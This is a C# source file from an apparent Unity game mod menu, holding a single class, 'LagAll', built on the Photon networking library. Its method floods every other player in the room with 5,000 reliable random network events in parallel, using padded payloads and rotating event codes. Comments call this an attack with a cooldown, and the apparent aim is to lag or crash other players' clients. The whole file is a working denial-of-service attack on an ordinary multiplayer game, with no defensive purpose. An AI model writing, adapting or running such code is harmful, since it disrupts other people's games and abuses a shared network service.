using System.Threading.Tasks;
using Photon.Pun;
using Photon.Realtime;
using ExitGames.Client.Photon;
using UnityEngine;

namespace IDK83.Mods
{
    internal class LagAll
    {
        public static float CreateCrashMethod = 0f;

        public static void CrashAllMethod()
        {
            if (Time.time <= CreateCrashMethod) return;

            int packetsToSend = 5000;
            int[] eventCodes = { 204, 205, 206, 207 }; // Randomized usable event codes
            System.Random rand = new System.Random();

            Parallel.For(0, packetsToSend, i =>
            {
                try
                {
                    LoadBalancingClient networkingClient = PhotonNetwork.NetworkingClient;

                    object[] payload = new object[]
                    {
                        rand.Next(-999999999, 999999999),
                        rand.Next(0, 255),
                        new byte[128] // Increase payload size
                    };

                    RaiseEventOptions options = new RaiseEventOptions
                    {
                        CachingOption = EventCaching.DoNotCache,
                        Receivers = ReceiverGroup.Others
                    };

                    SendOptions sendOptions = new SendOptions { Reliability = true };

                    int code = eventCodes[rand.Next(0, eventCodes.Length)];

                    networkingClient.OpRaiseEvent((byte)code, payload, options, sendOptions);

                    PhotonNetwork.SendAllOutgoingCommands();
                    networkingClient.LoadBalancingPeer.SendOutgoingCommands();
                    networkingClient.LoadBalancingPeer.DispatchIncomingCommands();
                }
                catch { }
            });

            CreateCrashMethod = Time.time + 10f; // Cooldown between attacks
        }
    }
}